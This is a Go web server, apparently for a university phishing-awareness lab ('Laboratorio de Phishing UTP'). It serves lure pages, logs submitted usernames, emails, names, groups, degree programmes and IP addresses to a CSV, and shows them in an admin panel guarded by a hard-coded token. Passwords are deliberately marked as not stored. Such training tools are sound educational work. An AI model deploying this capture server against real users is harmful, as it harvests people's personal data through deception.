package main

import (
	"embed"
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io/fs"
	"log"
	"net/http"
	"os"
	"strings"
	"sync"
	"time"
)

//go:embed dist/*
var staticFiles embed.FS

const adminToken = "utp-admin-secret-2025"
const csvFile = "capturas.csv"

var mu sync.Mutex

type Submission struct {
	Username string `json:"username"`
	Email    string `json:"email"`
	Nombre   string `json:"nombre"`
	Grupo    string `json:"grupo"`
	Carrera  string `json:"carrera"`
	Step     string `json:"step"`
}

func main() {
	initCSV()

	mux := http.NewServeMux()

	mux.HandleFunc("/api/login", func(w http.ResponseWriter, r *http.Request) {
		if r.Method != http.MethodPost {
			http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
			return
		}

		var s Submission
		if err := json.NewDecoder(r.Body).Decode(&s); err != nil {
			http.Error(w, "Invalid JSON", http.StatusBadRequest)
			return
		}

		ip := getIP(r)

		now := time.Now().Format("2006-01-02 15:04:05")
		var row []string

		if s.Step == "1" {
			row = []string{now, s.Username, "", "", "", "", ip, "NO ALMACENADA", "1"}
			log.Printf("[PASO 1] Usuario: %s, IP: %s", s.Username, ip)
		} else {
			row = []string{now, s.Username, s.Email, s.Nombre, s.Grupo, s.Carrera, ip, "NO ALMACENADA", "2"}
			log.Printf("[PASO 2] Email: %s, Nombre: %s, Grupo: %s, Carrera: %s, IP: %s", s.Email, s.Nombre, s.Grupo, s.Carrera, ip)
		}

		mu.Lock()
		f, err := os.OpenFile(csvFile, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
		if err == nil {
			w := csv.NewWriter(f)
			w.Write(row)
			w.Flush()
			f.Close()
		}
		mu.Unlock()

		if err != nil {
			log.Printf("Error writing CSV: %v", err)
			http.Error(w, "Server error", http.StatusInternalServerError)
			return
		}

		w.WriteHeader(http.StatusOK)
		json.NewEncoder(w).Encode(map[string]string{"status": "ok"})
	})

	mux.HandleFunc("/api/admin", func(w http.ResponseWriter, r *http.Request) {
		token := r.URL.Query().Get("token")
		if token != adminToken {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		records := readCSV()
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		fmt.Fprint(w, renderAdmin(records))
	})

	mux.HandleFunc("/api/captures/count", func(w http.ResponseWriter, r *http.Request) {
		token := r.URL.Query().Get("token")
		if token != adminToken {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		records := readCSV()
		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]int{"count": len(records)})
	})

	mux.HandleFunc("/api/captures/clear", func(w http.ResponseWriter, r *http.Request) {
		token := r.URL.Query().Get("token")
		if token != adminToken {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		mu.Lock()
		os.Remove(csvFile)
		initCSV()
		mu.Unlock()

		w.Header().Set("Content-Type", "application/json")
		json.NewEncoder(w).Encode(map[string]string{"status": "cleared"})
	})

	mux.HandleFunc("/api/captures/export", func(w http.ResponseWriter, r *http.Request) {
		token := r.URL.Query().Get("token")
		if token != adminToken {
			http.Error(w, "Unauthorized", http.StatusUnauthorized)
			return
		}

		mu.Lock()
		data, err := os.ReadFile(csvFile)
		mu.Unlock()

		if err != nil {
			http.Error(w, "Not found", http.StatusNotFound)
			return
		}

		w.Header().Set("Content-Type", "text/csv; charset=utf-8")
		w.Header().Set("Content-Disposition", "attachment; filename=capturas.csv")
		w.Write(data)
	})

	sub, err := fs.Sub(staticFiles, "dist")
	if err != nil {
		log.Fatal(err)
	}

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		path := r.URL.Path

		if path == "/" || path == "" {
			path = "/index.html"
		} else if path == "/skull" || path == "/skull.html" {
			path = "/skull/index.html"
		} else if path == "/alert" || path == "/alert.html" {
			path = "/alert/index.html"
		} else if path == "/deletion" || path == "/deletion.html" {
			path = "/deletion/index.html"
		}

		data, err := fs.ReadFile(sub, path[1:])
		if err != nil {
			http.NotFound(w, r)
			return
		}

		contentType := "text/plain"
		switch {
		case strings.HasSuffix(path, ".html"):
			contentType = "text/html; charset=utf-8"
		case strings.HasSuffix(path, ".css"):
			contentType = "text/css"
		case strings.HasSuffix(path, ".js"), strings.HasSuffix(path, ".mjs"):
			contentType = "application/javascript"
		case strings.HasSuffix(path, ".jpg"), strings.HasSuffix(path, ".jpeg"):
			contentType = "image/jpeg"
		case strings.HasSuffix(path, ".png"):
			contentType = "image/png"
		case strings.HasSuffix(path, ".gif"):
			contentType = "image/gif"
		case strings.HasSuffix(path, ".svg"):
			contentType = "image/svg+xml"
		case strings.HasSuffix(path, ".ico"):
			contentType = "image/x-icon"
		case strings.HasSuffix(path, ".webp"):
			contentType = "image/webp"
		}

		w.Header().Set("Content-Type", contentType)
		w.Write(data)
	})

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}

	log.Printf("=== Laboratorio de Phishing UTP ===")
	log.Printf("Servidor: http://0.0.0.0:%s", port)
	log.Printf("Admin:    http://0.0.0.0:%s/api/admin?token=%s", port, adminToken)
	log.Fatal(http.ListenAndServe("0.0.0.0:"+port, mux))
}

func initCSV() {
	mu.Lock()
	defer mu.Unlock()

	if _, err := os.Stat(csvFile); os.IsNotExist(err) {
		f, err := os.Create(csvFile)
		if err != nil {
			log.Fatalf("Cannot create CSV: %v", err)
		}
		w := csv.NewWriter(f)
		w.Write([]string{
			"fecha_hora",
			"usuario",
			"correo",
			"nombre",
			"grupo",
			"carrera",
			"ip",
			"password_status",
			"paso",
		})
		w.Flush()
		f.Close()
	}
}

func readCSV() [][]string {
	mu.Lock()
	defer mu.Unlock()

	f, err := os.Open(csvFile)
	if err != nil {
		return nil
	}
	defer f.Close()

	r := csv.NewReader(f)
	records, err := r.ReadAll()
	if err != nil {
		return nil
	}

	if len(records) > 1 {
		return records[1:]
	}
	return nil
}

func getIP(r *http.Request) string {
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		parts := strings.Split(xff, ",")
		return strings.TrimSpace(parts[0])
	}
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}
	idx := strings.LastIndex(r.RemoteAddr, ":")
	if idx >= 0 {
		return r.RemoteAddr[:idx]
	}
	return r.RemoteAddr
}

func renderAdmin(records [][]string) string {
	html := `<!DOCTYPE html>
<html lang="es">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Admin - Capturas</title>
	<style>
		* { margin:0; padding:0; box-sizing:border-box; }
		body { font-family:'Segoe UI',Arial,sans-serif; background:#0f0f1a; color:#e0e0e0; padding:20px; }
		.container { max-width:1200px; margin:0 auto; }
		h1 { color:#ff4444; margin-bottom:4px; font-size:22px; }
		.subtitle { color:#888; margin-bottom:16px; font-size:13px; }
		.actions { margin:16px 0; display:flex; gap:10px; align-items:center; flex-wrap:wrap; }
		.badge { display:inline-block; background:#ff4444; color:#fff; padding:3px 10px; border-radius:10px; font-size:12px; }
		.btn { padding:7px 14px; border:none; border-radius:4px; cursor:pointer; font-size:13px; text-decoration:none; display:inline-block; }
		.btn-refresh { background:#4a4a8a; color:#fff; }
		.btn-refresh:hover { background:#5a5aaa; }
		.btn-danger { background:#ff4444; color:#fff; }
		.btn-danger:hover { background:#cc3333; }
		.btn-export { background:#228B22; color:#fff; }
		.btn-export:hover { background:#1a6b1a; }
		table { width:100%; border-collapse:collapse; background:#1a1a2e; border-radius:8px; overflow:hidden; }
		th { background:#16213e; color:#ff4444; padding:10px 8px; text-align:left; font-size:12px; text-transform:uppercase; }
		td { padding:9px 8px; border-bottom:1px solid #2a2a4e; font-size:13px; word-break:break-all; }
		tr:hover { background:#222244; }
		tr td:last-child { color:#4CAF50; font-style:italic; }
		.empty { text-align:center; padding:40px; color:#666; }
		.footer { margin-top:20px; text-align:center; color:#555; font-size:12px; }
		@media(max-width:768px){ body { padding:10px; } table { font-size:11px; } th,td { padding:5px 3px; } }
	</style>
</head>
<body>
	<div class="container">
		<h1>Panel Admin - Capturas</h1>
		<p class="subtitle">Laboratorio de Phishing &mdash; Entorno Controlado</p>

		<div class="actions">
			<span class="badge">` + fmt.Sprintf("%d", len(records)) + ` capturas</span>
			<button class="btn btn-refresh" onclick="location.reload()">Refrescar</button>
			<a class="btn btn-export" href="/api/captures/export?token=` + adminToken + `">Exportar CSV</a>
			<button class="btn btn-danger" onclick="if(confirm('¿Borrar todos los datos? Esta acci\u00f3n es irreversible.')){fetch('/api/captures/clear?token=` + adminToken + `',{method:'POST'}).then(()=>location.reload())}">Borrar todo</button>
		</div>

		<table>
			<thead>
				<tr>
					<th>#</th>
					<th>Paso</th>
					<th>Fecha/Hora</th>
					<th>Usuario</th>
					<th>Correo</th>
					<th>Nombre</th>
					<th>Grupo</th>
					<th>Carrera</th>
					<th>IP</th>
					<th>Password</th>
				</tr>
			</thead>
			<tbody>
	`

	if len(records) == 0 {
		html += `<tr><td colspan="10" class="empty">No hay capturas a\u00fan</td></tr>`
	} else {
		for i, rec := range records {
			var col [9]string
			for j := 0; j < 9 && j < len(rec); j++ {
				col[j] = esc(rec[j])
			}
			if col[7] == "" {
				col[7] = "NO ALMACENADA"
			}
			stepDisplay := "Paso " + col[8]
			if col[8] == "1" {
				stepDisplay = `<span style="color:#ffaa00">Paso 1</span>`
			} else if col[8] == "2" {
				stepDisplay = `<span style="color:#4CAF50">Paso 2</span>`
			}

			row := fmt.Sprintf(`
				<tr>
					<td>%d</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
					<td>%s</td>
				</tr>`,
				i+1, stepDisplay, col[0], col[1], col[2], col[3], col[4], col[5], col[6], col[7])
			html += row
		}
	}

	html += `
			</tbody>
		</table>
		<div class="footer">Entorno controlado - Laboratorio de Ciberseguridad UTP</div>
	</div>
</body>
</html>`
	return html
}

func esc(s string) string {
	var result []byte
	for _, c := range []byte(s) {
		switch c {
		case '&':
			result = append(result, "&amp;"...)
		case '<':
			result = append(result, "&lt;"...)
		case '>':
			result = append(result, "&gt;"...)
		case '"':
			result = append(result, "&quot;"...)
		case '\'':
			result = append(result, "&#39;"...)
		default:
			result = append(result, c)
		}
	}
	return string(result)
}
